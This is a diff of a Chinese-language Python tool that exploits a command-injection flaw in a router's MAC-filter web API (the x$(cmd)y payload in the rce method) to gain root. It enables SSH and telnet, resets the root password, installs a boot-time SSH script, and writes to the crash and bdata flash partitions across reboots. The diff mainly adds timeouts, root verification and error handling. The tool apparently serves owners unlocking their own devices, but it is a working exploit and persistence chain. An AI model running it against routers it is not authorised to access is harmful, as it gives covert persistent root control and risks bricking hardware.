@@ -13,7 +13,16 @@
 依赖: pip install requests ssh2-python
 """
 
-import sys, os, time, socket, random, hashlib, re
+import base64
+import hashlib
+import random
+import re
+import select
+import shlex
+import socket
+import sys
+import time
+import uuid
 
 try:
     import requests
@@ -29,46 +38,86 @@ if sys.platform == 'win32':
     except Exception:
         pass
 
-def _hidden_input(prompt):
-    """Windows 下用 msvcrt 实现密码隐藏输入, 避免 getpass 在 MinTTY 下报警"""
+def _windows_console():
+    """Only use console APIs when stdin itself is a Windows console handle."""
+    import ctypes
+    from ctypes import wintypes
     import msvcrt
-    sys.stdout.write(prompt)
-    sys.stdout.flush()
-    buf = []
-    while True:
-        ch = msvcrt.getwch()
-        if ch in ('\r', '\n'):
-            sys.stdout.write('\n')
-            break
-        if ch == '\x03':            # Ctrl+C
-            raise KeyboardInterrupt
-        if ch == '\x08':            # Backspace
-            if buf:
-                buf.pop()
-            continue
-        if ch in ('\x00', '\xe0'):  # 功能键, 吞掉后续扫描码
-            msvcrt.getwch()
-            continue
-        buf.append(ch)
-    return ''.join(buf)
+    try:
+        handle = msvcrt.get_osfhandle(sys.stdin.fileno())
+        kernel = ctypes.WinDLL('kernel32', use_last_error=True)
+        kernel.GetConsoleMode.argtypes = [wintypes.HANDLE, ctypes.POINTER(wintypes.DWORD)]
+        kernel.GetConsoleMode.restype = wintypes.BOOL
+        kernel.SetConsoleMode.argtypes = [wintypes.HANDLE, wintypes.DWORD]
+        kernel.SetConsoleMode.restype = wintypes.BOOL
+        mode = wintypes.DWORD()
+        if kernel.GetConsoleMode(handle, ctypes.byref(mode)):
+            return kernel, handle, mode.value
+    except (OSError, ValueError, AttributeError):
+        pass
+    return None
+
+
+def _visible_secret_input(prompt):
+    print('  [!] 当前输入环境无法隐藏密码，输入可能显示在屏幕上；完成后按回车。', flush=True)
+    return input(prompt)
+
+
+def _hidden_input(prompt):
+    """Read from the same stdin as ordinary prompts, with console echo disabled."""
+    console = _windows_console()
+    if console is None:
+        return _visible_secret_input(prompt)
+    kernel, handle, original_mode = console
+    # Enable line editing and Ctrl+C processing, disable character echo.
+    hidden_mode = (original_mode | 0x0001 | 0x0002) & ~0x0004
+    if not kernel.SetConsoleMode(handle, hidden_mode):
+        return _visible_secret_input(prompt)
+    try:
+        print('  输入密码时不显示字符或星号，完成后按回车。', flush=True)
+        return input(prompt)
+    finally:
+        restored = kernel.SetConsoleMode(handle, original_mode)
+        print(flush=True)
+        if not restored:
+            print('  [!] 终端输入模式恢复失败，请关闭当前终端后重新打开。', flush=True)
 
 def ask(prompt, default=None, secret=False):
     """带默认值的输入提示"""
     tip = f'{prompt} [{default}]: ' if default is not None else f'{prompt}: '
     try:
-        if secret and sys.stdin.isatty():
-            if sys.platform == 'win32':
+        if secret:
+            if not sys.stdin.isatty():
+                v = _visible_secret_input(tip)
+            elif sys.platform == 'win32':
                 v = _hidden_input(tip)
             else:
                 import getpass
+                print('  输入密码时不显示字符或星号，完成后按回车。', flush=True)
                 v = getpass.getpass(tip)
         else:
             v = input(tip)
     except (EOFError, KeyboardInterrupt):
         print('\n已取消')
         sys.exit(0)
-    v = v.strip()
+    if not secret:
+        v = v.strip()
     return v if v else default
+
+
+def validate_password(password):
+    if not isinstance(password, str) or not password:
+        raise ValueError('密码不能为空')
+    if any(ord(ch) < 32 or ord(ch) == 127 for ch in password):
+        raise ValueError('密码不能包含换行、NUL 或其他控制字符')
+
+
+class RemoteCommandError(RuntimeError):
+    def __init__(self, status, stdout='', stderr=''):
+        self.status = status
+        self.stdout = stdout
+        self.stderr = stderr
+        super().__init__(f'远程命令失败 (退出码 {status}): {stderr or stdout}')
 
 def confirm(prompt, default=False):
     v = ask(f'{prompt} (y/n)', 'y' if default else 'n')
@@ -110,16 +159,21 @@ class RouterWeb:
     def rce(self, mac, cmd):
         """通过 macfilter name 注入执行命令。payload 不能含 ';'。"""
         name = f'x$({cmd})y'
-        assert ';' not in name, 'payload 不能含分号'
+        if ';' in name:
+            raise ValueError('payload 不能含分号')
         r = self.s.post(
             f'http://{self.ip}/cgi-bin/luci/;stok={self.stok}/api/xqsystem/set_macfilter_rules',
             data={'mac': mac, 'name': name, 'option': 'add', 'wan': ''}, timeout=20)
+        r.raise_for_status()
         return r.json().get('code') == 0
 
     def macfilter_del(self, mac):
-        self.s.post(
+        r = self.s.post(
             f'http://{self.ip}/cgi-bin/luci/;stok={self.stok}/api/xqsystem/set_macfilter_rules',
             data={'mac': mac, 'name': 'x', 'option': 'del', 'wan': ''}, timeout=8)
+        r.raise_for_status()
+        if r.json().get('code') != 0:
+            raise RuntimeError('删除 MAC 规则被路由器拒绝')
 
 # ---------------------------------------------------------------- SSH / Telnet 执行
 
@@ -127,23 +181,86 @@ class SSH:
     def __init__(self, ip, user, password):
         from ssh2.session import Session
         self.sock = socket.create_connection((ip, 22), timeout=5)
-        self.s = Session()
-        self.s.handshake(self.sock)
-        self.s.userauth_password(user, password)
+        try:
+            self.s = Session()
+            self.s.set_timeout(5000)
+            self.s.handshake(self.sock)
+            self.s.userauth_password(user, password)
+            self.sock.setblocking(False)
+            self.s.set_blocking(False)
+        except BaseException:
+            self.close()
+            raise
+
+    def _wait(self, deadline):
+        from ssh2.session import (LIBSSH2_SESSION_BLOCK_INBOUND,
+                                  LIBSSH2_SESSION_BLOCK_OUTBOUND)
+        remaining = deadline - time.monotonic()
+        if remaining <= 0:
+            raise TimeoutError('SSH 命令执行超时')
+        directions = self.s.block_directions()
+        readable = [self.sock] if directions & LIBSSH2_SESSION_BLOCK_INBOUND else []
+        writable = [self.sock] if directions & LIBSSH2_SESSION_BLOCK_OUTBOUND else []
+        # No libssh2 direction can also mean that we are waiting for remote EOF.
+        if not readable and not writable:
+            readable = [self.sock]
+        ready = select.select(readable, writable, [], remaining)
+        if not ready[0] and not ready[1]:
+            raise TimeoutError('SSH 命令执行超时')
+
+    def _call(self, operation, deadline):
+        from ssh2.error_codes import LIBSSH2_ERROR_EAGAIN
+        while True:
+            if time.monotonic() >= deadline:
+                raise TimeoutError('SSH 命令执行超时')
+            result = operation()
+            if result != LIBSSH2_ERROR_EAGAIN:
+                if isinstance(result, int) and result < 0:
+                    raise ConnectionError(f'SSH 通道错误: {result}')
+                return result
+            self._wait(deadline)
 
     def run(self, cmd, timeout=30):
-        ch = self.s.open_session()
-        ch.execute(cmd)
-        out = b''
-        while True:
-            try:
-                n, data = ch.read()
-            except Exception:
-                break
-            if n <= 0:
-                break
-            out += data
-        return out.decode(errors='replace')
+        from ssh2.error_codes import LIBSSH2_ERROR_EAGAIN
+        deadline = time.monotonic() + timeout
+        try:
+            ch = self._call(self.s.open_session, deadline)
+            self._call(lambda: ch.execute(cmd), deadline)
+            self._call(ch.send_eof, deadline)
+            out, err = bytearray(), bytearray()
+            while True:
+                if time.monotonic() >= deadline:
+                    raise TimeoutError('SSH 命令执行超时')
+                progress = False
+                for reader, buffer in ((ch.read, out), (ch.read_stderr, err)):
+                    n, data = reader()
+                    if n > 0:
+                        buffer.extend(data)
+                        progress = True
+                    elif n < 0 and n != LIBSSH2_ERROR_EAGAIN:
+                        raise ConnectionError(f'SSH 读取错误: {n}')
+                # Drain both streams even when EOF has already arrived.
+                if not progress:
+                    if ch.eof():
+                        break
+                    self._wait(deadline)
+            self._call(ch.wait_eof, deadline)
+            self._call(ch.close, deadline)
+            self._call(ch.wait_closed, deadline)
+            status = ch.get_exit_status()
+            stdout = out.decode(errors='replace')
+            stderr = err.decode(errors='replace')
+            if status != 0:
+                raise RemoteCommandError(status, stdout, stderr)
+            return stdout
+        except RemoteCommandError:
+            raise
+        except (TimeoutError, ConnectionError):
+            self.close()
+            raise
+        except Exception as exc:
+            self.close()
+            raise ConnectionError(f'SSH 执行中断: {exc}') from exc
 
     def close(self):
         try:
@@ -154,35 +271,107 @@ class SSH:
 class Telnet:
     """应急通道: 重启后 dropbear 未启动时用 (nvram telnet_en=1)"""
     def __init__(self, ip, user, password):
+        validate_password(password)
         self.s = socket.create_connection((ip, 23), timeout=5)
-        self.s.settimeout(3)
-        self._read(2)
-        self.s.sendall(user.encode() + b'\n'); self._read(1)
-        self.s.sendall(password.encode() + b'\n')
-        banner = self._read(2)
-        if b'Login incorrect' in banner:
-            raise RuntimeError('telnet 登录失败')
+        self._pending = b''
+        self._iac = bytearray()
+        try:
+            self._expect(rb'(?im)(?:login|username):\s*$', 10)
+            self.s.sendall(user.encode() + b'\n')
+            self._expect(rb'(?im)password:\s*$', 10)
+            self.s.sendall(password.encode() + b'\n')
+            self._expect(rb'(?m)^[^\r\n]*[#$>]\s*$', 15)
+            verify_root(self)
+        except BaseException:
+            self.close()
+            raise
+
+    def _decode_telnet(self, data):
+        """Strip IAC negotiation, including commands split across recv calls."""
+        self._iac.extend(data)
+        out = bytearray()
+        while self._iac:
+            if self._iac[0] != 255:
+                out.append(self._iac.pop(0))
+                continue
+            if len(self._iac) < 2:
+                break
+            command = self._iac[1]
+            if command == 255:
+                out.append(255)
+                del self._iac[:2]
+            elif command in (251, 252, 253, 254):
+                if len(self._iac) < 3:
+                    break
+                option = self._iac[2]
+                if command == 251:  # WILL: accept server echo and suppress-go-ahead.
+                    self.s.sendall(bytes((255, 253 if option in (1, 3) else 254, option)))
+                elif command == 253:  # DO: the client only supports suppress-go-ahead.
+                    self.s.sendall(bytes((255, 251 if option == 3 else 252, option)))
+                del self._iac[:3]
+            elif command == 250:  # Subnegotiation ends at IAC SE.
+                end = self._iac.find(b'\xff\xf0', 2)
+                if end < 0:
+                    break
+                del self._iac[:end + 2]
+            else:
+                del self._iac[:2]
+        return bytes(out)
 
     def _read(self, t=1.0):
-        buf = b''
-        end = time.time() + t
-        while time.time() < end:
+        end = time.monotonic() + t
+        while time.monotonic() < end:
             try:
+                self.s.settimeout(max(0.001, end - time.monotonic()))
                 d = self.s.recv(4096)
                 if not d:
-                    break
-                buf += d
+                    raise ConnectionError('Telnet 连接已关闭')
+                data = self._decode_telnet(d)
+                if data:
+                    return data
             except socket.timeout:
                 break
-        return buf
+        return b''
+
+    def _expect(self, pattern, timeout, login=True):
+        end = time.monotonic() + timeout
+        while True:
+            if login and re.search(rb'(?i)login incorrect|authentication fail|access denied', self._pending):
+                raise RuntimeError('Telnet 登录失败')
+            match = re.search(pattern, self._pending)
+            if match:
+                before = self._pending[:match.start()]
+                self._pending = self._pending[match.end():]
+                return before, match
+            remaining = end - time.monotonic()
+            if remaining <= 0:
+                raise TimeoutError('等待 Telnet 响应超时')
+            self._pending += self._read(remaining)
 
     def run(self, cmd, timeout=15):
-        self.s.sendall(cmd.encode() + b'; echo __D__\n')
-        out = b''
-        end = time.time() + timeout
-        while time.time() < end and b'__D__' not in out.split(cmd.encode())[-1]:
-            out += self._read(1)
-        return out.decode(errors='replace')
+        token = uuid.uuid4().hex
+        begin, end = f'__BEGIN_{token}__', f'__END_{token}__'
+        line = (f"printf '\\n%s\\n' '{begin}'; sh -c {shlex.quote(cmd)} 2>&1; "
+                f"__rd08_status=$?; printf '\\n%s:%s\\n' '{end}' \"$__rd08_status\"\n")
+        deadline = time.monotonic() + timeout
+        try:
+            self.s.settimeout(max(0.001, timeout))
+            self.s.sendall(line.encode())
+            self._expect(rb'(?m)^' + begin.encode() + rb'\r?\n',
+                         deadline - time.monotonic(), login=False)
+            out, match = self._expect(rb'\r?\n' + end.encode() + rb':([0-9]+)\r?\n',
+                                      deadline - time.monotonic(), login=False)
+            output = out.decode(errors='replace').replace('\r\n', '\n')
+            status = int(match.group(1))
+            if status:
+                raise RemoteCommandError(status, output)
+            return output
+        except RemoteCommandError:
+            raise
+        except BaseException:
+            # A partial response cannot safely be reused for another command.
+            self.close()
+            raise
 
     def close(self):
         try:
@@ -190,55 +379,87 @@ class Telnet:
         except Exception:
             pass
 
+def verify_root(sh):
+    if sh.run('id -u').strip() != '0':
+        raise RuntimeError('未获得已验证的 root shell')
+
+
 def get_shell(ip, password, tries=1):
     """优先 SSH, 失败回退 Telnet"""
     last = None
-    for _ in range(tries):
-        try:
-            return SSH(ip, 'root', password)
-        except Exception as e:
-            last = e
-        try:
-            return Telnet(ip, 'root', password)
-        except Exception as e:
-            last = e
-        time.sleep(2)
+    for attempt in range(tries):
+        for transport in (SSH, Telnet):
+            sh = None
+            try:
+                sh = transport(ip, 'root', password)
+                verify_root(sh)
+                return sh
+            except Exception as e:
+                last = e
+                if sh is not None:
+                    sh.close()
+        if attempt + 1 < tries:
+            time.sleep(2)
     raise RuntimeError(f'SSH/Telnet 均无法登录: {last}')
+
+
+def verify_ssh(ip, password, tries=3):
+    last = None
+    for attempt in range(tries):
+        sh = None
+        try:
+            sh = SSH(ip, 'root', password)
+            verify_root(sh)
+            return True
+        except Exception as exc:
+            last = exc
+        finally:
+            if sh is not None:
+                sh.close()
+        if attempt + 1 < tries:
+            time.sleep(2)
+    raise RuntimeError('SSH 登录验证失败，不能确认 SSH 已开启或密码已生效') from last
 
 # ---------------------------------------------------------------- 功能 1: 开启临时 SSH
 
 def enable_ssh(web, rootpw):
+    validate_password(rootpw)
+    password_data = base64.b64encode(f'{rootpw}\n{rootpw}\n'.encode()).decode()
     base = random.randint(0x10, 0xD0)
     macs = [f'0A:11:22:33:44:{base + i:02X}' for i in range(3)]
     steps = [
         ('写入 nvram ssh_en=1', 'nvram set ssh_en=1 && nvram set telnet_en=1 && nvram commit'),
         ('修改 dropbear 并启动', 'sed -i "s/channel=.*/channel=\\"debug\\"/g" /etc/init.d/dropbear && /etc/init.d/dropbear start'),
-        (f'设置 root 密码为 {rootpw}', f'echo -e "{rootpw}\\n{rootpw}" | passwd root'),
+        ('设置 root 密码', f"printf '%s' '{password_data}' | base64 -d | passwd root"),
     ]
+    attempted = []
     try:
         for i, (desc, cmd) in enumerate(steps):
             print(f'  [{i+1}/3] {desc} ...')
+            attempted.append(macs[i])
             if not web.rce(macs[i], cmd):
                 print('  注入请求被拒绝, 可能固件已修复')
                 return False
         time.sleep(2)
-        return tcp_open(web.ip, 22)
+        return verify_ssh(web.ip, rootpw)
     finally:
-        for m in macs:
-            web.macfilter_del(m)
+        for m in attempted:
+            try:
+                web.macfilter_del(m)
+            except Exception as exc:
+                print(f'  [!] MAC 规则 {m} 清理失败 ({type(exc).__name__})，请在后台检查')
 
 # ---------------------------------------------------------------- 功能 2: 软固化 (开机自启)
 
 AUTO_SSH = """#!/bin/sh
 # auto_ssh: 每次开机重新放开 dropbear (nvram ssh_en 已持久, 只需修 channel)
 sleep 5
-sed -i 's/channel=.*/channel="debug"/g' /etc/init.d/dropbear
+sed -i 's/channel=.*/channel="debug"/g' /etc/init.d/dropbear || exit 1
 /etc/init.d/dropbear restart
 """
 
 def _install_auto_ssh(sh):
     """通过已有 shell 安装 auto_ssh 开机自启 (base64 传输避免引号问题)"""
-    import base64
     b64 = base64.b64encode(AUTO_SSH.encode()).decode()
     for c in [
         'mkdir -p /data/auto_ssh',
@@ -251,13 +472,22 @@ def _install_auto_ssh(sh):
         "uci commit firewall",
     ]:
         sh.run(c)
+    digest = hashlib.sha256(AUTO_SSH.encode()).hexdigest()
+    sh.run('test -x /data/auto_ssh/auto_ssh.sh && '
+           'sh -n /data/auto_ssh/auto_ssh.sh && '
+           'test "$(sha256sum /data/auto_ssh/auto_ssh.sh | cut -d \' \' -f 1)" '
+           f'= {shlex.quote(digest)}')
+    for key, expected in (('auto_ssh', 'include'), ('auto_ssh.type', 'script'),
+                          ('auto_ssh.path', '/data/auto_ssh/auto_ssh.sh'),
+                          ('auto_ssh.enabled', '1')):
+        if sh.run(f'uci get firewall.{key}').strip() != expected:
+            raise RuntimeError(f'软固化配置校验失败: firewall.{key}')
 
 def soft_persist(ip, rootpw):
     sh = get_shell(ip, rootpw)
     try:
         _install_auto_ssh(sh)
-        out = sh.run('uci get firewall.auto_ssh.path')
-        return 'auto_ssh.sh' in out
+        return True
     finally:
         sh.close()
 
@@ -267,23 +497,56 @@ def wait_router_down(ip):
     print('  等待路由器重启 ...', flush=True)
     time.sleep(5)
     for _ in range(12):  # 最多等 ~60s 让端口先关掉
-        if not tcp_open(ip, 22) and not tcp_open(ip, 80):
+        if not any(tcp_open(ip, port) for port in (22, 23, 80)):
             return True
         time.sleep(5)
     return False
 
-def wait_router_up(ip, rootpw, timeout=420):
+def read_boot_id(sh):
+    value = sh.run('cat /proc/sys/kernel/random/boot_id').strip()
+    try:
+        return str(uuid.UUID(value))
+    except ValueError as exc:
+        raise RuntimeError('无法取得有效的启动编号，停止固化') from exc
+
+
+def wait_router_up(ip, rootpw, timeout=420, previous_boot_id=None):
     print('  等待路由器上线 ...', flush=True)
-    end = time.time() + timeout
-    while time.time() < end:
-        if tcp_open(ip, 80):
-            try:
-                sh = get_shell(ip, rootpw)
+    end = time.monotonic() + timeout
+    while time.monotonic() < end:
+        sh = None
+        try:
+            sh = get_shell(ip, rootpw)
+            if previous_boot_id is None or read_boot_id(sh) != previous_boot_id:
                 return sh
-            except Exception:
-                pass
-        time.sleep(6)
-    raise RuntimeError('等待超时, 路由器未恢复。请手动检查路由器状态后再继续。')
+        except Exception:
+            pass
+        if sh is not None:
+            sh.close()
+        time.sleep(min(6, max(0, end - time.monotonic())))
+    raise RuntimeError('等待超时，未确认路由器已重启并恢复 root 登录。请手动检查状态。')
+
+
+def reboot_and_reconnect(sh, ip, rootpw):
+    previous_boot_id = read_boot_id(sh)
+    try:
+        try:
+            sh.run('reboot')
+        except (ConnectionError, TimeoutError):
+            # Reboot may close the connection before returning an exit status.
+            print('  重启命令连接中断，继续核对下线状态及启动编号 ...')
+    finally:
+        sh.close()
+    if not wait_router_down(ip):
+        raise RuntimeError('未观察到路由器下线，停止固化；请检查实际状态后再处理')
+    return wait_router_up(ip, rootpw, previous_boot_id=previous_boot_id)
+
+
+def verify_flags(sh, store):
+    for key, expected in (('ssh_en', '1'), ('telnet_en', '1'),
+                          ('uart_en', '1'), ('boot_wait', 'on')):
+        if sh.run(f'{store} get {key}').strip() != expected:
+            raise RuntimeError(f'{store} 校验失败: {key}')
 
 def deep_persist(ip, rootpw):
     print('''
@@ -296,33 +559,41 @@ def deep_persist(ip, rootpw):
         return False
 
     sh = get_shell(ip, rootpw)
-    sh.run("zz=$(dd if=/dev/zero bs=1 count=2 2>/dev/null) ; printf '\\xA5\\x5A%c%c' $zz $zz | mtd write - crash")
-    sh.run('reboot')
-    sh.close()
-    wait_router_down(ip)
-    sh = wait_router_up(ip, rootpw)
+    stage = '写入 crash'
+    try:
+        # Confirm that reboot verification is available before touching flash.
+        read_boot_id(sh)
+        sh.run("zz=$(dd if=/dev/zero bs=1 count=2 2>/dev/null) ; printf '\\xA5\\x5A%c%c' $zz $zz | mtd write - crash")
+        stage = '第 1 次重启'
+        sh = reboot_and_reconnect(sh, ip, rootpw)
 
-    print('  [第 2 步] 写入 bdata ...')
-    sh.run('nvram set ssh_en=1 && nvram set telnet_en=1 && nvram set uart_en=1 && nvram set boot_wait=on && nvram commit')
-    sh.run('bdata set ssh_en=1 && bdata set telnet_en=1 && bdata set uart_en=1 && bdata set boot_wait=on && bdata commit')
-    sh.run('reboot')
-    sh.close()
-    wait_router_down(ip)
-    sh = wait_router_up(ip, rootpw)
+        stage = '写入 bdata'
+        print('  [第 2 步] 写入 bdata ...')
+        sh.run('nvram set ssh_en=1 && nvram set telnet_en=1 && nvram set uart_en=1 && nvram set boot_wait=on && nvram commit')
+        sh.run('bdata set ssh_en=1 && bdata set telnet_en=1 && bdata set uart_en=1 && bdata set boot_wait=on && bdata commit')
+        verify_flags(sh, 'nvram')
+        verify_flags(sh, 'bdata')
+        stage = '第 2 次重启'
+        sh = reboot_and_reconnect(sh, ip, rootpw)
 
-    print('  [第 3 步] 擦除 crash ...')
-    sh.run('mtd erase crash')
-    sh.run('reboot')
-    sh.close()
-    wait_router_down(ip)
-    sh = wait_router_up(ip, rootpw)
+        stage = '擦除 crash'
+        print('  [第 3 步] 擦除 crash ...')
+        verify_flags(sh, 'bdata')
+        sh.run('mtd erase crash')
+        stage = '第 3 次重启'
+        sh = reboot_and_reconnect(sh, ip, rootpw)
 
-    # 调试引导循环会清空 /data 和 overlay 配置, 需重新开启 dropbear 并重装 auto_ssh
-    print('  [收尾] 恢复 dropbear 并重装 auto_ssh 自启 ...')
-    sh.run('sed -i \'s/channel=.*/channel="debug"/g\' /etc/init.d/dropbear && /etc/init.d/dropbear start')
-    _install_auto_ssh(sh)
-    sh.close()
-    return True
+        stage = '恢复自启配置'
+        print('  [收尾] 恢复 dropbear 并重装 auto_ssh 自启 ...')
+        verify_flags(sh, 'bdata')
+        sh.run('sed -i \'s/channel=.*/channel="debug"/g\' /etc/init.d/dropbear && /etc/init.d/dropbear start')
+        _install_auto_ssh(sh)
+        return verify_ssh(ip, rootpw)
+    except Exception as exc:
+        raise RuntimeError(f'深度固化在「{stage}」阶段中断: {exc}。'
+                           '请检查设备及分区状态，不要直接从第 1 步重跑。') from exc
+    finally:
+        sh.close()
 
 # ---------------------------------------------------------------- 主流程
 
@@ -341,7 +612,12 @@ def main():
         sys.exit(f'[!] 无法连接 {ip}, 请确认电脑与路由器在同一网络')
 
     webpw = ask('路由器管理密码 (Web 后台密码)', secret=True)
-    rootpw = ask('要设置的 SSH root 密码', 'admin')
+    rootpw = ask('要设置的 SSH root 密码', secret=True)
+    try:
+        validate_password(webpw)
+        validate_password(rootpw)
+    except ValueError as exc:
+        sys.exit(f'[!] {exc}')
 
     web = RouterWeb(ip, webpw)
     try:
@@ -353,7 +629,7 @@ def main():
     while True:
         ssh_on = tcp_open(ip, 22)
         print('\n---------------- 菜单 ----------------')
-        print(f'  当前 SSH 状态: {"已开启" if ssh_on else "未开启"}')
+        print(f'  SSH 端口状态: {"可连接（尚未验证登录）" if ssh_on else "未开放"}')
         print('  1 - 开启 SSH (漏洞利用, 重启后失效)')
         print('  2 - 固化 SSH (软固化: 开机自启脚本, 需 SSH 已开启)')
         print('  3 - 深度固化 (bdata/crash 分区, 三次重启, 抗固件升级)')
@@ -364,21 +640,24 @@ def main():
             break
         elif choice == '1':
             print('\n[!] 即将对路由器执行命令注入以开启 SSH (root 权限)。')
-            print('    该操作不修改任何分区, 重启后失效, 但理论上存在极小风险。')
+            print('    将修改 root 密码并持久保存 ssh_en/telnet_en；dropbear 修改通常重启后失效。')
             if not confirm('确认要开启 SSH 吗?'):
                 continue
-            if enable_ssh(web, rootpw):
-                print(f'\n[+] SSH 已开启: ssh root@{ip}  密码: {rootpw}')
-            else:
-                print('\n[-] SSH 端口未开放, 注入可能已被修复')
+            try:
+                if enable_ssh(web, rootpw):
+                    print(f'\n[+] SSH root 登录已验证: ssh root@{ip}，使用刚才输入的密码')
+                else:
+                    print('\n[-] 开启请求被拒绝，未确认成功')
+            except Exception as exc:
+                print(f'\n[-] 开启失败: {exc}')
         elif choice == '2':
             print('\n[!] 软固化: 在 /data/auto_ssh 安装开机自启脚本 (uci firewall include)。')
-            print('    不碰系统分区, 可用 uci delete firewall.auto_ssh 卸载, 安全可逆。')
+            print('    卸载自启项需执行 uci delete firewall.auto_ssh && uci commit firewall。')
             if not confirm('确认进行软固化?'):
                 continue
             try:
                 if soft_persist(ip, rootpw):
-                    print('[+] 软固化完成, 重启后 SSH 将自动开启')
+                    print('[+] 自启脚本及配置已安装并校验，开机自启效果仍需重启验证')
                 else:
                     print('[-] 校验失败, 请手动检查')
             except Exception as e:
@@ -391,7 +670,7 @@ def main():
                 continue
             try:
                 if deep_persist(ip, rootpw):
-                    print('[+] 深度固化完成! 固件升级/恢复出厂后 SSH/telnet 仍可恢复')
+                    print('[+] 三次重启、bdata 配置及 SSH 登录已验证；升级/恢复出厂后的行为需另行验证')
             except Exception as e:
                 print(f'[-] 中断: {e}')
         else:
